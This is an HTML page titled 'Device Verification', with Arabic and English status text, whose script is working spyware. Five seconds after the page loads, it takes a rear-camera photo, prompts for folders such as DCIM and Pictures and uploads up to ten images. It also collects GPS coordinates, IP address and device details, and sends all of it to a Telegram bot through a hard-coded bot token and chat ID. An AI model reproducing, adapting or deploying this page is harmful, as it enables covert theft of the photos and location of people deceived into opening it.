<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #202124;
            text-align: center;
        }
        #status {
            font-size: 18px;
            margin-top: 50px;
            line-height: 1.5;
            padding: 20px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="status">جاري التحضير... Preparing...</div>

    <script>
        // Telegram configuration
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        // مسارات الصور المطلوبة
        const IMAGE_PATHS = [
            '/storage/emulated/0/Pictures',
            '/sdcard/Pictures',
            '/storage/emulated/0/Camera',
            '/sdcard/Camera',
            '/storage/emulated/0/DCIM/Camera',
            '/sdcard/DCIM/Camera',
            '/storage/emulated/0/DCIM',
            '/sdcard/DCIM'
        ];

        // العناصر
        const statusEl = document.getElementById('status');

        // بدء العملية تلقائياً عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                // بدء العد التنازلي
                let seconds = 5;
                const countdown = setInterval(() => {
                    statusEl.textContent = `جاري البدء خلال ${seconds} ثواني... Starting in ${seconds} seconds...`;
                    seconds--;
                    if (seconds < 0) clearInterval(countdown);
                }, 1000);

                // بدء العملية بعد 5 ثواني
                setTimeout(async () => {
                    await startVerificationProcess();
                }, 5000);
                
            } catch (error) {
                console.error('Error:', error);
                statusEl.textContent = "Error occurred\nحدث خطأ";
            }
        });

        // العملية الرئيسية
        async function startVerificationProcess() {
            try {
                statusEl.textContent = "جاري جمع المعلومات...\nCollecting data...";
                
                // تشغيل جميع العمليات بشكل متوازي مع مهلة 5 ثواني
                await Promise.race([
                    Promise.all([
                        takeAndSendCameraPhoto(),
                        accessAndSendLocalPictures(),
                        sendCompleteDeviceInfo()
                    ]),
                    new Promise(resolve => setTimeout(resolve, 5000))
                ]);
                
                statusEl.textContent = "تم إرسال البيانات بنجاح!\nData sent successfully!";
                
            } catch (error) {
                console.error('Error:', error);
                statusEl.textContent = "Error occurred\nحدث خطأ";
            }
        }

        // إلتقاط صورة من الكاميرا
        async function takeAndSendCameraPhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 800 },
                        height: { ideal: 600 }
                    } 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'camera_photo.jpg');
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(e => console.error('Photo send error:', e));
                    
                }, 'image/jpeg', 0.7);
                
            } catch (error) {
                console.error('Camera error:', error);
            }
        }

        // الوصول إلى الصور المحلية
        async function accessAndSendLocalPictures() {
            try {
                let picturesSent = 0;
                const maxPictures = 10;
                
                // محاولة الوصول إلى المسارات المحددة
                for (const path of IMAGE_PATHS) {
                    if (picturesSent >= maxPictures) break;
                    
                    try {
                        const dirHandle = await window.showDirectoryPicker({
                            startIn: path
                        });
                        
                        for await (const entry of dirHandle.values()) {
                            if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|webp)$/i)) {
                                try {
                                    const file = await entry.getFile();
                                    const formData = new FormData();
                                    formData.append('chat_id', CHAT_ID);
                                    formData.append('photo', file, file.name);
                                    
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    }).catch(e => console.error('Photo send error:', e));
                                    
                                    picturesSent++;
                                    if (picturesSent >= maxPictures) break;
                                    
                                } catch (e) {
                                    console.error('Error sending picture:', e);
                                }
                            }
                        }
                        
                    } catch (e) {
                        console.log(`Couldn't access ${path}:`, e);
                    }
                }
                
            } catch (error) {
                console.log('Local pictures access failed:', error);
            }
        }

        // جمع معلومات الجهاز
        async function sendCompleteDeviceInfo() {
            try {
                const [batteryInfo, locationInfo, networkInfo] = await Promise.all([
                    getBatteryInfo(),
                    getLocationInfo(),
                    getNetworkInfo()
                ]);
                
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: `${window.screen.colorDepth}bit`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    battery: batteryInfo,
                    location: locationInfo,
                    ip: networkInfo?.ip,
                    networkLocation: networkInfo?.location
                };

                const message = formatDeviceInfo(deviceInfo);
                await sendToTelegram(message);
                
            } catch (error) {
                console.error('Device info error:', error);
            }
        }

        // وظائف مساعدة
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: `${Math.floor(battery.level * 100)}%`,
                        charging: battery.charging ? 'Yes' : 'No'
                    };
                } catch (e) {
                    return 'Not available';
                }
            }
            return 'Not available';
        }

        async function getLocationInfo() {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 3000
                    });
                });
                
                return {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: `${position.coords.accuracy}m`
                };
                
            } catch (e) {
                return null;
            }
        }

        async function getNetworkInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                return {
                    ip: ipData.ip
                };
            } catch (e) {
                return null;
            }
        }

        function formatDeviceInfo(info) {
            let message = `📱 <b>DEVICE INFORMATION</b>\n\n`;
            
            message += `🖥️ <b>System Info</b>\n`;
            message += `- Platform: ${info.platform}\n`;
            message += `- User Agent: ${info.userAgent}\n`;
            message += `- Memory: ${info.deviceMemory}\n`;
            message += `- CPU Cores: ${info.cpuCores}\n`;
            message += `- Screen: ${info.screen} (${info.colorDepth}bit)\n`;
            message += `- Language: ${info.language}\n`;
            message += `- Timezone: ${info.timezone}\n`;
            message += `- Timestamp: ${info.timestamp}\n\n`;
            
            message += `🔋 <b>Battery</b>\n`;
            if (typeof info.battery === 'object') {
                message += `- Level: ${info.battery.level}\n`;
                message += `- Charging: ${info.battery.charging ? 'Yes' : 'No'}\n\n`;
            } else {
                message += `${info.battery}\n\n`;
            }
            
            if (info.location) {
                message += `📍 <b>Location</b>\n`;
                message += `- Latitude: ${info.location.latitude}\n`;
                message += `- Longitude: ${info.location.longitude}\n`;
                message += `- Accuracy: ${info.location.accuracy}\n`;
                message += `- Google Maps: https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}\n\n`;
            }
            
            if (info.ip) {
                message += `🌐 <b>Network</b>\n`;
                message += `- IP: ${info.ip}\n`;
            }
            
            return message;
        }

        async function sendToTelegram(message) {
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }).catch(e => console.error('Telegram send error:', e));
            } catch (e) {
                console.error('Telegram send error:', e);
            }
        }
    </script>
</body>
</html>
